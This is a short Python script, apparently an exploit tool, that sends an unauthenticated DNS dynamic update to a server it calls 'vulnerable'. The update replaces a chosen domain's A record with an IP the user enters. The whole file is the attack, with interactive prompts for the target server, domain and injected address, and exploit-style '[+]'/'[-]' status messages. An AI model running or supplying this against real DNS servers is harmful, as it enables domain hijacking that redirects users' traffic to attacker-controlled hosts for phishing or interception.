import dns.query
import dns.update
import dns.tsigkeyring
import dns.resolver

def inject_dns_record(vulnerable_dns_ip, domain_name, a_record_ip):
    # Create an update object
    update = dns.update.Update(domain_name)

    # Add a new A record
    update.replace(domain_name, 300, 'A', a_record_ip)

    try:
        # Send the update to the DNS server
        response = dns.query.tcp(update, vulnerable_dns_ip)

        # Check the response code
        if response.rcode() == 0:
            print(f"[+] Successfully injected the A record for {domain_name} with IP {a_record_ip}")
        else:
            print(f"[-] Failed to inject the A record. Response code: {response.rcode()}")

    except Exception as e:
        print(f"[-] An error occurred: {str(e)}")

if __name__ == "__main__":
    # Input: Vulnerable DNS IP, Domain name, and the desired A record IP
    vulnerable_dns_ip = input("Enter the vulnerable DNS server IP: ")
    domain_name = input("Enter the domain name (website): ")
    a_record_ip = input("Enter the A record IP to inject: ")

    # Attempt to inject the DNS record
    inject_dns_record(vulnerable_dns_ip, domain_name, a_record_ip)
